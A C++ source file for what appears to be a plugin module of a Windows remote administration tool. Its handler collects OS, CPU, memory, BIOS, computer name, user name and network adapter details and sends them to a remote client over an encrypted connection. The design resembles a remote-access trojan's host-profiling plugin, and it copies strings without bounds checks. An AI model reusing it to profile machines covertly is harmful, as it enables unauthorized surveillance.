#include <winsock2.h>
#include <iphlpapi.h>
#include <Nb30.h>
#include <vector>
#include <string>

#include "queryInfo.h"
#include "macro.h"
#include "conn.h"
#include "svrdll.h"
#include <Windows.h>

using namespace std;

class HelpClass
{
public:
	DECLARE_DLLINFO_MAP()
};

BEGIN_DLLINFO_MAP(HelpClass)
	ADD_DLLINFO_ENTRY(CONTROL_QUERY_INFO, 10, "QueryInfomation")
END_DLLINFO_MAP()

int GetDllFuncCnt(){return HelpClass::GetInfoCnt();}

const dll_info* GetDllFuncs(){return HelpClass::GetInfos();}

struct AdapterInfo{
	unsigned int		mac_len;
	unsigned char		mac[8];
	unsigned long		index;
	unsigned int		type;
	string				name;

	vector<string>		ips;
	vector<string>		ip_masks;

	vector<string>		gateways; 
	vector<string>		gateway_masks;
};

int GetAdaptersList(struct AdapterInfo infos[])
{
	IP_ADAPTER_INFO pai[10];
	ULONG ulSize = sizeof(pai);
	int nAdapters = 0;

	if(GetAdaptersInfo(pai, &ulSize) != ERROR_SUCCESS)
		return -1;
	
	IP_ADAPTER_INFO* p = &pai[0];
	while(p)
	{
		//Fill mac-address info
		infos[nAdapters].mac_len = p->AddressLength;
		memcpy(infos[nAdapters].mac, p->Address, p->AddressLength);
		infos[nAdapters].index = p->Index;
		infos[nAdapters].type = p->Type;
		infos[nAdapters].name = p->Description;

		//Get IP info
		int nIPs = 0;
		IP_ADDR_STRING* pipList = &p->IpAddressList;
		while(pipList)
		{
			infos[nAdapters].ips.push_back(pipList->IpAddress.String);
			infos[nAdapters].ip_masks.push_back(pipList->IpMask.String);
			pipList = pipList->Next;
		}
		
		//Get gateway info
		IP_ADDR_STRING* pGatewayList = &p->GatewayList;
		while(pGatewayList)
		{
			infos[nAdapters].gateways.push_back(pGatewayList->IpAddress.String);
			infos[nAdapters].gateway_masks.push_back(pGatewayList->IpMask.String);
			pGatewayList = pGatewayList->Next;
		}

		nAdapters++;
		p = p->Next;
	}
	
	return nAdapters;
}

int GetNetworkInfo(struct network_info nws[], int maxCnt)
{
	struct AdapterInfo infos[16];
	int n = 16;

	if( (n = GetAdaptersList(infos)) > 0)
	{
		if(n > maxCnt)	n = maxCnt;
		for(int i = 0; i < n; i++)
		{
			strcpy(nws[i].ip, infos[i].ips[0].c_str());
			strcpy(nws[i].gateway, infos[i].gateways[0].c_str());
			strcpy(nws[i].mask, infos[i].ip_masks[0].c_str());
			strncpy(nws[i].name, infos[i].name.c_str(), sizeof(nws[i].name));
		}
		return n;
	}
	return 0;
}

int QueryInfomation(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_ENCYRPT_HEADER(CONTROL_QUERY_INFO);
	//control_header header = INITIALIZE_HEADER(CONTROL_QUERY_INFO);
	int nStatus = 0;
	system_info info;

	memset(&info, 0, sizeof(info));

	//操作系统版本
	OSVERSIONINFOEXA os; 
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA); 
	if(GetVersionExA((OSVERSIONINFOA *)&os)){ 
		info.windows.majorVersion = os.dwMajorVersion;
		info.windows.minorVersion = os.dwMinorVersion;
		info.windows.buildNumber = os.dwBuildNumber;
		info.windows.platformId = os.dwPlatformId;
		info.windows.productType = os.wProductType;
		//printf("%d %d %d %d %d\n", info.majorVersion, info.minorVersion, info.buildNumber,
		//	info.platformId, info.productType);
	}

	SYSTEM_INFO si;
	GetNativeSystemInfo(&si);

	//CPU
	SYSTEM_INFO	sysInfo = {0};
	HKEY hKey;
	unsigned char tmp[280];
	ULONG cb;
	GetSystemInfo(&sysInfo);
	info.cpuCount = sysInfo.dwNumberOfProcessors;

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
		0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		cb = sizeof(tmp);
		if(RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, tmp, &cb) == ERROR_SUCCESS)	//获取处理器名称
			strncpy(info.cpuDesc, (char*)tmp, sizeof(info.cpuDesc)-1);
		
		cb = sizeof(info.cpuSpeed);
		RegQueryValueExA(hKey, "~MHz", NULL, NULL, (LPBYTE)&info.cpuSpeed, &cb);			//获取处理器主频

		RegCloseKey(hKey);
	}

	//内存
	MEMORYSTATUSEX Buffer = {0};
	Buffer.dwLength = sizeof(Buffer);
	GlobalMemoryStatusEx(&Buffer);
	
	info.totalMemory = Buffer.ullTotalPhys/1024;
	info.availMemory = Buffer.ullAvailPhys/1024;
	//printf("dwTotalPhys %d dwAvailPhys %d\n", Buffer.ullTotalPhys/(1024*1024), Buffer.ullAvailPhys/(1024*1024));

	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS",
		0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		cb = sizeof(tmp);
		if(RegQueryValueExA(hKey, "BIOSVendor", NULL, NULL, tmp, &cb) == ERROR_SUCCESS)
			strncpy(info.biosDesc, (char*)tmp, sizeof(info.biosDesc)-1);

		cb = sizeof(tmp);
		if(RegQueryValueExA(hKey, "BIOSVersion", NULL, NULL, tmp, &cb) == ERROR_SUCCESS)
			strncat(info.biosDesc, (char*)tmp, sizeof(info.biosDesc)-1);
	}

	//计算机名称
	DWORD len = 64;
	GetComputerNameA(info.computerName, &len);

	//用户名
	len = 64;
	GetUserNameA(info.userName, &len);

	//系统目录
	char buffer[64];
	if(GetSystemDirectoryA(buffer, sizeof(buffer)))
		strncpy(info.sysDir, buffer, sizeof(info.sysDir)-1);
	if(GetWindowsDirectoryA(buffer, sizeof(buffer)))
		strncpy(info.winDir, buffer, sizeof(info.winDir)-1);

	const int maxNW = 16;
	struct network_info nws[maxNW];
	char sendBuf[maxNW*sizeof(network_info)+sizeof(info)];
	int cntNW = GetNetworkInfo(nws, maxNW);
	info.cntNW = cntNW;

	if(fn)
	{
		header.dataLen = sizeof(info) + cntNW * sizeof(struct network_info);
		memcpy(sendBuf, &info, sizeof(info));
		memcpy(sendBuf+sizeof(info), &nws[0], cntNW * sizeof(network_info));
		fn(s, &header, sendBuf, header.dataLen);
	}

	return 0;
}